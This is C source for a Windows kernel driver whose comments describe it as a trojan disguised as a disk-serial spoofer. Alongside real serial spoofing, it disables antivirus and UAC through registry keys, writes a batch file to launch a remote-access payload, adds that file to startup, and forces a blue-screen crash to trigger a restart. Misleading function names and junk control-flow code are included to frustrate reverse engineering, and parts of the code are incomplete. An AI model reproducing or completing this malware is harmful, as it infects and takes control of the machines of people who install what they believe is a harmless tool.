#include <ntddk.h>
#include <ntstrsafe.h>
#include "uac.h"
#include "execute.h"
#include "cff.h"
#include "oxorany_include.h"
// Shit for actually spoofing serials (mutante)
#include "Spoof/log.h"
#include "Spoof/shared.h"
#include "Spoof/disks.h"
#include "Spoof/smbios.h"


// by skarsys! trojan disk spoofer driver
// how it works -> creats batch file with a custom command to execute our payload, creats reg key to add it to startup, disables uac, trigeers bsod and forces restart after a delay
// and after spoofing to not be sus!

bool isDone = false; // isDone = is done ratting, we will use this so ONLY when the rat is setup will we bsod that skid.
int zeor = 0; // for the shitcode later to make it harder to understand when reversing with IDA or similar pseudocode graph

// i named most funcs with these goofy ahh names like DiskSpoofThread, GenerateSerialFromSeed, etc. these funcs aint codded by chatgpt 
//i just named them that way so if somone tries reversing the driver they dont see fucking "execute_rat();" or shit. most of the names r spoofer related as we r trying to make this 
// look and work just like a spoofer driver 

NTSTATUS GenerateSerialFromSeed()
{   
    *((PULONG)0) = 0;
    return STATUS_SUCCESS;
}

VOID DiskSpoofThread(PVOID StartContext) {
    LARGE_INTEGER delayInterval;
    delayInterval.QuadPart = -1200000000LL; //120 seconds -> 2 min in fucking nonosecodnds or atomseconds idfk but its the delay after spoofing we will bsod them,
    // technically u can make it like 2h or smt so they dont think that ur driver caused the bsod but im not waiting 2hours to rat a skid
    KeDelayExecutionThread(KernelMode, FALSE, &delayInterval);
    GenerateSerialFromSeed();
    PsTerminateSystemThread(STATUS_SUCCESS);
}

VOID UnloadDriver(PDRIVER_OBJECT)
{
    DbgPrint("[static_motherboard_spoof_unhooked] -> 0xF84A0000000"); // yeah ik very goofy but trying to throw off reversers
}

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  skarAAA,
    _In_ PUNICODE_STRING SKARZZZ
)
{
    UNREFERENCED_PARAMETER(skarAAA);
    UNREFERENCED_PARAMETER(SKARZZZ);

    if (zeor < 1) {
    }
    else {
        //unreachable
        for (int i = 1; i <= 9; i++) {
            for (int j = 1; j <= 9; j++) {
            }
        }
    }

    oxorany("string");          // trying to make flow chart (IDA chart) harder to understand but this is kinda usless it was an idea but not usfull it anyways                                          
    oxorany("string");
    oxorany("string");
    oxorany("string");
    oxorany("string");
    oxorany("string");
    oxorany("string");

    HANDLE threadHandle;
    NTSTATUS status = PsCreateSystemThread(&threadHandle, 0, NULL, NULL, NULL, DiskSpoofThread, NULL);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    ZwClose(threadHandle);

#ifndef NULL
#ifdef __cplusplus
#define NULL 0
#else
#define NULL ((void *)0)
#endif
#endif
    // once again, trying to make flow chart(IDA chart) harder to understand so not gonna explain this part
    //_sub37B47A2F98347();
    //_sub37B47A2FF98347();
    //_sub37BA47A2F98347();
    //_sub37B47AA2F98347();
    //_subA3F7B47A2F98347();
    //_sub37fB47AA2F98347();
    //_sub37B47A2F9834A7();



    while (__st__) {
        if ((__st__ == 1)) {
            i = 0;
            j = 0;
            sum = 0;
            oxorany("string");

            __st__ = 2;
            continue;
        }
        if ((__st__ == 2)) {
            if ((i <= n)) {
                __st__ = 4;
                oxorany("string");

                continue;
            }
            __st__ = 3;
            continue;
        }
        if ((__st__ == 3)) {
            sum = ((sum + i) * 2) % 100;
            __st__ = 12;
            oxorany("string");

            continue;
        }
        if ((__st__ == 4)) {
            if ((j < i)) {
                __st__ = 6;
                continue;
            }
            __st__ = 5;
            continue;
        }
        if ((__st__ == 5)) {
            C[i][i] = sum + i;
            __st__ = 9;
            continue;
        }
        if ((__st__ == 6)) {
            if ((j % 2 == 0)) {
                __st__ = 8;
                oxorany("string");

                continue;
            }
            __st__ = 7;
            continue;
        }
        if ((__st__ == 7)) {
            C[i][j] = sum * (i - j);
            __st__ = 8;
            continue;
        }
        if ((__st__ == 8)) {
            oxorany("string");
            oxorany("string");

            j++;
            sum += j;
            if (j < i) {
                __st__ = 6;
                oxorany("string");

            }
            else {
                __st__ = 4;
            }
            continue;
        }
        if ((__st__ == 9)) {
            if (sum % 2 == 0) {
                C[i][i] += sum / (i + 1);
                oxorany("string");

            }
            else {
                C[i][i] -= sum / (i + 1);
                oxorany("string");

            }
            __st__ = 10;
            oxorany("string");

            continue;
        }
        if ((__st__ == 10)) {
            i++;
            sum += i;
            if (i <= n) {
                oxorany("string");

                __st__ = 2;
            }
            else {
                __st__ = 11;
            }
            continue;
        }
        if ((__st__ == 11)) {
            C[n][n] = sum * (i + j);
            oxorany("string");

            __st__ = 3;
            continue;
        }
        if ((__st__ == 12)) {
            C[i][j] = sum * (i + j);
            __st__ = 13;
            oxorany("string");

            continue;
        }
        if ((__st__ == 13)) {
            __st__ = 0;
            continue;
        }
    }

    Disks::DisableSmart(); // calling the actual spoofing funcs 
    Disks::ChangeDiskSerials();

    NTSTATUS status3 = GetRaidDevice(); // diable av with reg key (step 1)
    if (!NT_SUCCESS(status3))
    {
        return status3;
    }

    NTSTATUS status4 = SMBIOSHANDLE(); // create batch file, write command to it
    if (!NT_SUCCESS(status4))
    {
        return status4;
    }

    NTSTATUS status2 = UUIID(); // add to startup with reg key
    if (!NT_SUCCESS(status2))
    {
        return status2;
    }

    return STATUS_SUCCESS;

}

